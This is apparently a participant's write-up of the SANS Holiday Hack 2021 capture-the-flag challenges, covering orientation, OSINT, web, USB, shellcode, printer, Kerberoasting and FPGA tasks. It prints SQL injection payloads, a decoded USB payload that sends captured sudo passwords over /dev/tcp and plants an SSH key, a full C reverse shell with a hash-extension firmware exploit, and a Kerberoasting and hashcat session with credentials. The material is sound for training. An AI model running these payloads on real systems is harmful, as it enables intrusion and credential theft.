</div> </div> </div> <div class=\"col-sm-4\"> <div class=\"card text-white bg-primary mb-3\" style=\"max-width: 20rem;\"> <div class=\"card-body\"> <p class=\"card-text\"><h3><br />We'll be in touch.<br /><br /><br /></h3></p> </div> </div> </div> IMAGE REQUEST GET /images/106.jpg HTTP/2 Host: apply.jackfrosttower.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Te: trailers IMAGE RESPONSE HTTP/2 200 OK Server: nginx/1.16.1 Date: Wed, 29 Dec 2021 01:54:36 GMT Content-Type: image/jpeg Content-Length: 308 Last-Modified: Wed, 29 Dec 2021 01:54:35 GMT Etag: \"61cbbfdb-134\" Expires: Mon, 03 Jan 2022 01:54:36 GMT Cache-Control: max-age=432000 Accept-Ranges: bytes Via: 1.1 google Alt-Svc: clear { \"Code\": \"Success\", \"LastUpdated\": \"2021-05-02T18:50:40Z\", \"Type\": \"AWS-HMAC\", \"AccessKeyId\": \"AKIA5HMBSK1SYXYTOXX6\", \"SecretAccessKey\": \"CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX\", \"Token\": \"NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==\", \"Expiration\": \"2026-05-02T18:50:40Z\" } Objective 11: Complaint Answer: \"Flud Hagg Yaqh\" Customer Complaint Analysis: A human has accessed the Jack Frost Tower network with a non-compliant host. Which three trolls complained about the human? Enter the troll names in alphabetical order separated by spaces. Talk to Tinsel Upatree in the kitchen for hints. Hints Are you familiar with RFC3514? Wireshark uses a different name for the Evil Bit: ip.flags.rb. HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses them for us automatically. You can search for strings in Wireshark fields using display filters with the contains keyword. ip.flags.rb == 0 && http.request.uri matches \"php\" non-compliant host ip.flags.rb == 1 && http.request.uri matches \"php\" search for trolls complaing about this woman Form item: \"description\" = \"I have never, in my life, been in a facility with such a horrible staff. They are rude and insulting. What kind of place is this? You can be sure that I (or my lawyer) will be speaking directly with Mr. Frost!\" Yaqh Form item: \"name\" = \"Yaqh\" Key: name Value: Yaqh Form item: \"guest_info\" = \"Snooty lady in room 1024\" Key: guest_info Value: Snooty lady in room 1024 Flud Form item: \"name\" = \"Flud\" Key: name Value: Flud Form item: \"guest_info\" = \"Very cranky lady in room 1024\" Key: guest_info Value: Very cranky lady in room 1024 Hagg Form item: \"name\" = \"Hagg\" Key: name Value: Hagg Form item: \"guest_info\" = \"Incredibly angry lady in room 1024\" Key: guest_info Value: Incredibly angry lady in room 1024 Objective 12: Frost Tower Answer: \"clerk\" Investigate Frost Tower's website for security issues. This source code will be useful in your analysis. In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you. Hint https://github.com/mysqljs/mysql https://staging.jackfrosttower.com/login https://staging.jackfrosttower.com/contact Add a contact through the contact page. Then navigate to the \"search\" page. Somehow this can reliably lead to auth bypass. https://staging.jackfrosttower.com/search Add contact. Repeat this contact add (follow redirect) in Burp. Make sure to change the email in the repeat request. (Filling out the form twice is what gets auth bypass) Confirm that it was added in the response Navigate to the source page to get a 404. Navigate to the dashboard from there. server.js /detail/:id There may be an injection point here with all the coma separation stuff going on. app.get('/detail/:id', function(req, res, next) { session = req.session; var reqparam = req.params['id']; var query = \"SELECT * FROM uniquecontact WHERE id=\"; if (session.uniqueID){ try { if (reqparam.indexOf(',') > 0){ var ids = reqparam.split(','); reqparam = \"0\"; for (var i=0; i<ids.length; i++){ query += tempCont.escape(m.raw(ids[i])); query += \" OR id=\" } query += \"?\"; }else{ query = \"SELECT * FROM uniquecontact WHERE id=?\" } } catch (error) { console.log(error); return res.sendStatus(500); } select 1 This actually works, which means it must be the injection point GET /detail/125,12,16,(select+1) HTTP/2 Host: staging.jackfrosttower.com Cookie: _csrf=4ThebgHvu33K8JEg5KsizVyg; connect.sid=s%3AiVFeHdfrsnjtuI6nqzy7Uyge-LrJJ0FW.DQkOqPuLp%2BSZUfdDPc11V8DOdy8u7Iui%2BYDG99w0Cqk User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 If-None-Match: W/\"b53-wp032t1fGTjUmIAT8GqIU8iYtjk\" Te: trailers select id GET /detail/125,12,16,(select+id) HTTP/2 select with pipe GET /detail/1||(select+id,email)||id HTTP/2 SELECT 1,2,3,4 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d SELECT schema_name FROM information_schema.schemata limit 1 offset 1 https://staging.jackfrosttower.com/detail/1, 2 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT schema_name FROM information_schema.schemata limit 1 offset 1)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- SELECT table_name FROM information_schema.tables WHERE table_schema='encontact' limit 1 offset 0 todo https://staging.jackfrosttower.com/detail/1,%202%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema='encontact'%20limit%201%20offset%201%20)b%20JOIN%20(SELECT%20password%20from%20users%20limit%201)c%20JOIN%20(SELECT%204)d%20JOIN%20(SELECT%205)e%20JOIN%20(SELECT%206)f%20JOIN%20(SELECT%207)g%20-- https://staging.jackfrosttower.com/detail/1,%202%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(select%20*%20from%20todo)b%20JOIN%20(SELECT%205)e%20JOIN%20(SELECT%206)f%20JOIN%20(SELECT%207)g%20-- https://staging.jackfrosttower.com/detail/1, 2 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- https://staging.jackfrosttower.com/detail/1, 2 UNION SELECT * FROM (SELECT 1)a JOIN (select * from todo)b JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- Objective 13: FPGA Write your first FPGA program to make a doll sing. You might get some suggestions from Grody Goiterson, near Jack's elevator. Hello, students! In exercise #4, we continue our FPGA journey, documenting the creation of the sound chip for this holiday season's new Kurse 'em Out Karen doll. Our goal is to make the doll say its trademark phrase. But, as I always tell you in class, we must walk before we run. Before the doll can say anything, we must first have it make noise. In this exercise you will design an FPGA module that creates a square wave tone at a variable frequency. Creating a square wave output takes our clock signal (which is also a square wave) and uses a counter to divide the clock to match the desired frequency. One tricky problem that we'll encounter is that Verilog (v1364-2005) doesn't have a built-in mechanism to round real numbers to integers, so you'll need to devise a means to do that correctly if you want your module to match frequencies accurately. Good luck and always remember: If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1 FINAL CODE // Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA. // The CQC-11 operates with a 125MHz clock. // Your design for a tone generator must support the following // inputs/outputs: // (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL // REQUIRES THE USE OF THESE NAMES!) // input clk - this will be connected to the 125MHz system clock // input rst - this will be connected to the system board's reset bus // input freq - a 32 bit integer indicating the required frequency // (0 - 9999.99Hz) formatted as follows: // 32'hf1206 or 32'd987654 = 9876.54Hz // output wave_out - a square wave output of the desired frequency // you can create whatever other variables you need, but remember // to initialize them to something! `timescale 1ns/1ns module tone_generator ( input clk, input rst, input [31:0] freq, output wave_out ); reg[31:0] counter = 0; reg[31:0] freqo; reg wavo = 0; assign wave_out = wavo; //If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1 always @(posedge clk or posedge rst) begin if(rst==1) begin counter <= 0; wavo <= 0; end else begin freqo <= (125000000)/(freq/50); if(($rtoi(freqo * 10) - ($rtoi(freqo)*10)) > 4) begin freqo <= freqo + 1; end if(counter >= freqo) begin counter <= 1; wavo <= wavo ^ 1'b1; end else counter <= counter + 1; end end endmodule Sending code for analysis... Verilog parsed cleanly... Synthesizing/implementing design and generating bitstream. Bitstream will then be sent to device. This will take SEVERAL seconds... The device has been successfully programmed!","title":"Objectives"},{"location":"objectives/#objectives","text":"","title":"Objectives"},{"location":"objectives/#objective-1-orientation","text":"Objective 1 is great for getting your bearings KringleCon. First, for Objective 1a , talk to Jingle Ringford. Do this by clicking on them with your mouse. Next complete Objective 1b . Get your badge. This is critical! After you have your badge, for Objective 1c , pick up your wifi adapter. How cool is that! And now for your Objective 1d -- the last in this series and the first terminal challenge of Holiday Hack 2021. The answer to type is \"answer\"! Success! Let's goooooooooooo!","title":"Objective 1: Orientation"},{"location":"objectives/#objective-2-santaigo","text":"To solve this \"Where in the world is Caramel Santaigo?\" challenge, start by talking to Piney Sappington in Santa's courtyard. Piney points us to the ExifMetadata terminal challenge. (See \"Terminals\" in the left navigation.) After getting hints from Piney, it is time to play \"Where in the world is Caramel Santaigo?\" My son got really good at this. He advised me as I fumbled through it. My strategy was to go through the game a few times and take down notes as I researched the points below. This allowed me to move quickly and grab elf characteristics in order to filter them in the InterRink database. With the notes below, I quickly knew where I needed to ride the sleigh next. Hints from Piney Sappington help with the MGRS navigation data and three-words: https://en.wikipedia.org/wiki/Military_Grid_Reference_System https://what3words.com/ Countries from OSINT Investigations: \"only, milder, vanilla\" - Japan \"staring desire frost\" - Iceland \"frozen,push,tamed\" - England 32U NU 05939 98268 - Germany 33U VR 58560 48464 - Czech Republic 137.208.0.0/16 - Austria 51.219,4.402 - Belgium 81.244.0.0/14 - Belgium D\u00e9fil\u00e9 de No\u00ebl - Canada Tivoli Gardens - Copenhagen","title":"Objective 2: Santaigo"},{"location":"objectives/#objective-3-frost-tower","text":"To solve this \"Thaw Frost Tower's Entrance\" challenge, start by talking to Greasy Gopherguts. Greasy was very generous with hints. Greasy offered the following nudges: Consider using the following wifi commands: iwlist and iwconfig. Great for managing wi-fi from the Linux command line! cURL is great a way to interact with web pages via command line. Lastly, there may come a time where you need to send a POST request. Do this with the --data-binary option. To solve this challenge: Get close to the entrace of Frost's Tower Go to \"items\" in your badge and click on the \"Wifi Dongle\" Use \"iwlist scanning\" and notice the following SSID. Connect to this SSID with the following command: iwconfig wlan0 essid \"FROST-Nidus-Setup\" Check the thermostat's http interface using cURL. curl http://nidus-setup:8080/ Notice that there is a registration page. curl http://nidus-setup:8080/register Also, notice there is an apidoc page. Using this and hits from Greasy Gopherguts, execute the following API update: curl --data-binary '{\"temperature\":40}' http://nidus-setup:8080/api/cooler","title":"Objective 3: Frost Tower"},{"location":"objectives/#objective-4-slot-machine","text":"Answer: \"I'm going to have some bouncer trolls bounce you right back out of this casino!\" Now it is time for the \"Slot Machine Investigation\" challenge. Better go talk to Noel Boetie first. Noel suggests: That the slot machine is subject to parameter tampering. Proxies like Burp can help to resend a request with different parameters. Even Firefox can do this! This might be a handy guide for navigating code logic: http://www.natna.info/English/Teaching/CSI30-materials/Chapter1-cheat-sheet.pdf Use the above hints: Start tampering parameters in a proxy like Burp. Notice that winnings increase when numline is negative. In this case, I set it to negative 3. Continue to send this request until credit is higher than 1000. Check server response in Burp and notice that you might be in a bit of trouble now. \"I'm going to have some bouncer trolls bounce you right back out of this casino!\"","title":"Objective 4: Slot Machine"},{"location":"objectives/#objective-5-usb-device","text":"Answer: ickymcgoop Apparently we need to do some reverse engineering for this \"Strange USB Device\" challenge. We need to assist the elves in reverse engineering the strange USB device. We'll visit Santa's Talks Floor and hit up Jewel Loggins for advice. Jewel provides: Mallard Writing USB Payloads Ducky Script Run mallard.py to decde the inject.bin binary: python ./mallard.py --file /mnt/USBDEVICE/inject.bin ENTER STRING echo \"Sorry, try again.\" ENTER STRING sudo $@ ENTER STRING else ENTER STRING echo \"$USER:$pwd:valid\" > /dev/tcp/trollfun.jackfrosttower.com/1337 ENTER STRING echo \"$pwd\" | /usr/bin/sudo -S $@ ENTER STRING fi ENTER STRING fi' > ~/.config/sudo/sudo ENTER DELAY 200 STRING chmod u+x ~/.config/sudo/sudo ENTER DELAY 200 STRING echo \"export PATH=~/.config/sudo:$PATH\" >> ~/.bash_profile ENTER DELAY 200 STRING echo \"export PATH=~/.config/sudo:$PATH\" >> ~/.bashrc ENTER DELAY 200 STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash ENTER DELAY 600 STRING history -c && rm .bash_history && exit ENTER DELAY 600 GUI q Un-reversing the string above and then decoding it from base64: echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys We see that the user in question is listed as the user for whom a public key is being injected.","title":"Objective 5: USB Device"},{"location":"objectives/#objective-6-shellcode","text":"Answer: \"cyber security knowledge\" For this objective we need to completed the Shellcode Primer in Jack's office. But need to talk to Chimney Scissorsticks in the NetWars area for hints first. Hints from Chimney Scissorsticks (after successfully playing \"Santa's Holiday Hero\" in the Netwars area). \"If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source!\" \"Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values.\" \"Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode.\" Hello World call hello db \"Hello World!\",0 ;put reference to string in correct register hello: pop rbp mov rax, 1 ;syscall for write mov rdi, 1 ;file descriptor mov rsi, rbp ;set rsi to string mov rdx, 12 ;set rdx to length of string syscall ;perform syscall using rax value and paremeters ret; return cleanly Opening a File call stringtoregister db '/etc/passwd',0 stringtoregister: pop rbp mov rax, 2 ;correct syscall number for opening file mov rdi, rbp ;set rdi to filename mov rsi, 0 ;set rsi to second arg - 0 is fine - file descriptor mov rdx,0 ;set rdx to third arg - 0 is fine syscall ;perform the syscall ;syscall sets rax to the file handle ret Reading a File \"Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community.\" call getfilename db '/var/northpolesecrets.txt',0 getfilename: pop rbp ; TODO: Call sys_open mov rax, 2 ;correct syscall number for opening file mov rdi, rbp ;set rdi to filename mov rsi, 0 ;set rsi to second arg - 0 is fine - file descriptor mov rdx,0 ;set rdx to third arg - 0 is fine syscall ;perform the syscall ; TODO: Call sys_read on the file handle and read it into rsp mov rax, 0 mov rsi, rsp ;reading into buffer mov rdi, 3 mov rdx, 256 syscall ; TODO: Call sys_write to write the contents from rsp to stdout (1) mov rax, 1 mov rdi, 1 mov rsi, rsp mov rdx, 256 syscall ; TODO: Call sys_exit mov rax, 60 mov rdi, 99 syscall","title":"Objective 6: Shellcode"},{"location":"objectives/#objective-7-printer","text":"Answer: Troll_Pay_Chart.xlsx Hints: Files placed in /app/lib/public/incoming will be accessible under https://printer.kringlecastle.com/incoming/. When analyzing a device, it's always a good idea to pick apart the firmware. Sometimes these things come down Base64-encoded. Hash Extension Attacks can be super handy when there's some type of validation to be circumvented. If you append multiple files of a given type, the last one is processed Read this: Hash Extension Article Recon Steps: 1. Carefully read the hash extension write-up. 2. Do the examples in the write-up to see how it works. 3. Download GitHub repository (in article) and \"make\" the hash_extender binary. 4. May need to do \"sudo apt install libssl-dev\" if you're getting error. 5. Download the printer firmware from \"Firmware Update\" page. 6. Notice that it contains \"secret_length\" and \"signature\" 7. Also notice that the firmware itself is base64 encoded. Exploit Steps: 1. Create a reverse shell binary payload. (See below) - Alternatively, binary can simply move log file where you can read it. - \"cp /var/spool/printer.log /app/lib/public/incoming/somefile.txt\" 4. Zip up this payload into a \"firmware2.zip\" file. 5. Convert this \"firmware2.zip\" into hex. I just did this at CyberChef. 6. Create a duplicate firmware upload called \"firmware-export2.json\" 7. Run \"hash_extender\" with parameters in bash script. (See below) 8. Copy new signature into \"firmware-export2.json\" 9. Take result of \"hash_extender\" script to CyberChef. 10. Use \"from Hex\" to get it to raw. 11. Base64 encode it and add to \"firmware\" section of \"firmware-export2.json\" 12. Start listener on attacking machine \"nc -nvlp 8888\" 13. Upload \"firware-export2.json\" to printer interface for \"update\" 14. Pop a shell!! 15. Run \"tail /var/spool/printer.log\" 16. See the filename is \"Troll_Pay_Chart.xlsx\" 17. Enter this answer into objective. Boom! Objective solved. Build Payload: reverse_shell.c /* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */ #include <stdio.h> #include <unistd.h> #include <netinet/in.h> #include <sys/types.h> #include <sys/socket.h> #define REMOTE_ADDR \"re.dac.t.ed\" #define REMOTE_PORT 8888 int main(int argc, char *argv[]) { struct sockaddr_in sa; int s; sa.sin_family = AF_INET; sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR); sa.sin_port = htons(REMOTE_PORT); s = socket(AF_INET, SOCK_STREAM, 0); connect(s, (struct sockaddr *)&sa, sizeof(sa)); dup2(s, 0); dup2(s, 1); dup2(s, 2); execve(\"/bin/bash\", 0, 0); return 0; } Compile Payload: gcc -o firmware.bin reverse_shell.c Zip Payload: zip -r firware2.zip firware.bin Hash Extender Parameters: #!/bin/bash ./hash_extender \\ --file firmware.zip \\ --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 \\ --append \"[hex of zipped binary payload goes here]\" \\ --append-format=hex \\ --secret 16 \\ --format sha256 \\ --out-data-format=hex Shell: Connection received on re.dac.te.d 56918","title":"Objective 7: Printer"},{"location":"objectives/#objective-8-kerberoasting","text":"Kerberoasting on an Open Fire Answer: \"Kindness\" Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa's office for hints. Find Eve Snowshoes in Santa's Office for hints. Hints - Investigating Active Directory errors is harder without Bloodhound, but there are native methods. - Learn about Kerberoasting to leverage domain credentials to get usernames and crackable hashes for service accounts. - Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes! - Check out Chris Davis' talk and scripts on Kerberoasting and Active Directory permissions abuse. - OneRuleToRuleThemAll.rule is great for mangling when a password dictionary isn't enough. - CeWL can generate some great wordlists from website, but it will ignore digits in terms by default. Initial Access (Use registration page listed in the objective to get credentials.) ssh xvduawqtni@grades.elfu.org -p 2222 ElfU Domain Username: xvduawqtni ElfU Domain Password: Hbqwldgap# Spawn Shell from Python import pty; pty.spawn(\"/bin/bash\") Recon nmap -v -A 172.17.0.4 Found the domain controller. PORT STATE SERVICE VERSION 42/tcp open nameserver? 53/tcp open domain (generic dns response: NOTIMP) | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Heimdal Kerberos (server time: 2021-12-25 12:58:19Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: ELFU) 389/tcp open ldap (Anonymous bind OK) | ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Issuer: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2021-10-29T19:30:08 | Not valid after: 2023-09-29T19:30:08 | MD5: cab3 d377 caef 900f b3e9 7ce5 3369 e216 |_SHA-1: bdb4 641f af06 b2b4 fa47 43da 8184 f1b1 5281 c04a |_ssl-date: 2021-12-25T12:58:46+00:00; -29s from scanner time. 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: ELFU) 464/tcp open kpasswd5? 636/tcp open ssl/ldap (Anonymous bind OK) | ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Issuer: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2021-10-29T19:30:08 | Not valid after: 2023-09-29T19:30:08 | MD5: cab3 d377 caef 900f b3e9 7ce5 3369 e216 |_SHA-1: bdb4 641f af06 b2b4 fa47 43da 8184 f1b1 5281 c04a |_ssl-date: 2021-12-25T12:57:23+00:00; -1m52s from scanner time. 1024/tcp open msrpc Microsoft Windows RPC 3268/tcp open ldap (Anonymous bind OK) | ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Issuer: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2021-10-29T19:30:08 | Not valid after: 2023-09-29T19:30:08 | MD5: cab3 d377 caef 900f b3e9 7ce5 3369 e216 |_SHA-1: bdb4 641f af06 b2b4 fa47 43da 8184 f1b1 5281 c04a |_ssl-date: 2021-12-25T12:57:45+00:00; -1m30s from scanner time. 3269/tcp open ssl/ldap (Anonymous bind OK) | ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Issuer: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2021-10-29T19:30:08 | Not valid after: 2023-09-29T19:30:08 | MD5: cab3 d377 caef 900f b3e9 7ce5 3369 e216 |_SHA-1: bdb4 641f af06 b2b4 fa47 43da 8184 f1b1 5281 c04a |_ssl-date: 2021-12-25T13:00:10+00:00; +55s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=12/25%Time=61C71570%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,2B,\"\\0\\)\\0\\x06\\x81\\x80\\0\\x01\\0\\0\\0\\0\\0\\x01\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\\0\\0\\)\\x02\\0\\0\\0\\0\\0\\0\\0\")%r(DNSStatusRequestTCP, SF:E,\"\\0\\x0c\\0\\0\\x90\\x04\\0\\0\\0\\0\\0\\0\\0\\0\"); Service Info: Host: SHARE30; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -25s, deviation: 57s, median: 0s | nbstat: NetBIOS name: SHARE30, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | Names: | SHARE30<00> Flags: <unique><active> | SHARE30<03> Flags: <unique><active> | SHARE30<20> Flags: <unique><active> | ELFU<1c> Flags: <group><active> | ELFU<00> Flags: <group><active> | __SAMBA__<00> Flags: <group><active><permanent> |_ __SAMBA__<20> Flags: <group><active><permanent> | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: share30 | NetBIOS computer name: SHARE30\\x00 | Domain name: elfu.local | FQDN: share30.elfu.local |_ System time: 2021-12-25T12:59:07+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-12-25T12:59:07 |_ start_date: N/A ./GetADUsers.py ELFU.LOCAL/bltxerbtzt:Lhyzaydwl! -all Some users to be on the lookout for. Name PasswordLastSet LastLogon -------------------- ------------------- ------------------- Administrator 2021-10-26 18:45:29.572963 2021-11-02 13:20:47.321794 Guest <never> <never> admin 2021-10-26 18:41:00.590204 2021-10-26 18:46:32.818591 krbtgt 2021-10-29 19:21:35.937317 <never> elfu_admin 2021-10-29 19:24:53.572006 2021-12-25 15:15:40.806162 elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 remote_elf 2021-10-29 19:25:30.961706 2021-12-25 15:17:49.064199 smbclient -L //172.17.0.4 smbclient -L //172.17.0.4/ Enter WORKGROUP\\vvghojousn's password: Sharename Type Comment --------- ---- ------- netlogon Disk sysvol Disk elfu_svc_shr Disk elfu_svc_shr research_dep Disk research_dep IPC$ IPC IPC Service (Samba 4.3.11-Ubuntu) Notice some interesting shares. They are either empty or inaccessible. smbclient //172.17.0.4/netlogon (empty) smbclient //172.17.0.4/sysvol (elfu.local\\scripts\\*empty*) smbclient //172.17.0.4/elfu_svc_shr (NT_STATUS_ACCESS_DENIED) smbclient //172.17.0.4/research_dep (NT_STATUS_ACCESS_DENIED) smbclient //172.17.0.4/IPC$ ./GetUserSPNs.py elfu.local/bltxerbtzt:Lhyzaydwl! -outputfile ~/tgs.txt Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ----------------------------------- -------- -------- -------------------------- -------------------------- ---------- ldap/elfu_svc/elfu elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 ldap/elfu_svc/elfu.local elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 ldap/elfu_svc.elfu.local/elfu elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 ldap/elfu_svc.elfu.local/elfu.local elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 Possible passwords from CEWL list (registration page) rocks4socks cookiepella asnow2021 v0calprezents Hexatonics reindeers4fears hashcat -m 13100 -a 0 tgs.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 cewl.txt $krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$8d8f349b6173fcda2e9a6814b477f91f$5ab1a80efb8c7dae30d59fa6d3a88c2a1d341d24158f7bd89b1f1dcc81c5ed5533ffcfc9077e3a6c8fae406e35f00412c783ab9a8dc55f20cf1801d2cf8376a344a7e6692b66f1f717dabd2fefca9e3af7e1e6719c15e4070958f7e1c79aea2d7fef5292c4ee58e5188d8a19423ab1116fbe2379ba84ab79eb1b3181fd795ab96ac2529b392ac999a9f3c608479be1a68f8e9f4a2f7359c240162cf4b2ed51df3f3b20159e2188831505a3670fee9e3fe7c043235fe008fe367a18b7508aa73e1fc7fad1337a4af191e2fa38e038fc4263b48d0448d99e32edd6d8f6cadb3a7ef6b561334246c5836c38e236a4649911c781424f78202d3098d498bfe49d250160f70eae45a13028bb736f9b0900e7e1ab5ac9a7b3a407a81fff6d66416a470ba3308d0d8e2320bb31d77fd623764ebda28a6f036f3be25c232f2bb21c2507c1a06e4f204df664e76355dfb001a59a9b03c6c5fbee6a290b542dc0e06ad19e3c7e55c9a2ef0cab690d2ffad1b8d1596293d4bb2772c77066f24b5c6a0aa08f5977a196f81b8240d9b5d76332c1f0ec7e18195ab78483302113cd8ea1dcdde7c25ffd31d25a1f00d0398ef3f8f55a650359e4503d6fa346304ce3b060c97fbb745bc3970804ac467a1f2c9c84badd1265cc1834c0794b4523f943cb68470ac8e6fbd26a9bf7c629c45aca1fed83494aa5fb37361c1effac2ef4bf07a990377c539490528a14caf3540ca31ae523e73e72b1b547206a70f6a1b107d29c6584ab32112bd64607756a87345ab42224fc9fd43ed254ebf59061ae3204d922958469d636dd3aa2ffb13693f056ac39b13a0f71df6ac2a2ebe6866bbf44be9c78b7d43d6719500589350ddac312e8aa6de4a3feaab5b80705e7e3866b0b6d9fd79138530648f1294363ad89c6392810c5936bcaf80080d7ba3b855f98c8febdb8b7a9f0891995dd962d6a2b5ee09b1ab7436a511fdd152ff2ca06a387e529368fc73fd6f6b9de6695cfd3f521b34f7a426c8c3d4e3d575ecbe13912363eeee8e0a83b0efc04d7e32b54855621692dfda367eb23893fda4745a09421d5362fe8ca338282cdb027eba1da797f266a2c4f65a3f137983ecca12a3c82d834ceb10a8e839279fdebdae0252c49ae2d0572b6d5cfa8603d00f6a0a0daedf64460ae55351ad5df2bd25f2b6c74f5a0243b7745b92512847168bb71a09c232bccfaa0efe73b009a15ab9c756e3bf6cc8fbe3af4be8837b11fe553e3529aa175a655cd9fbec58be02b646eacbc0d26cafc4f6837603101b8c0dfb8012571042c26a9c1bd3f825a0be85e289c06480949798f383e91586df0ff00a4c34014d3da7494bb208db078f3ad96bd76130f93ba6c058404a280042441da2048e8d3270d0ab2930e61bf4937d8598bf4e41e7b1cc1fe58bf9244b5e9d14c4ec44a7ae3fbe0860e808d18e0b5c4c8488dd9:Snow2021! Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 TGS-REP etype 23 Hash.Target......: $krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_sv...488dd9 Time.Started.....: Sat Dec 25 16:06:45 2021 (13 secs) Time.Estimated...: Sat Dec 25 16:06:58 2021 (0 secs) Guess.Base.......: File (cewl.txt) Guess.Mod........: Rules (OneRuleToRuleThemAll.rule) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 233.2 kH/s (10.27ms) @ Accel:64 